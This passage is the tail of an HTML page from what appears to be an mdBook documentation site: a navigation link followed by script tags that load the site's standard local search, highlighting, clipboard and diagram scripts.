aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playground_copyable=!0</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>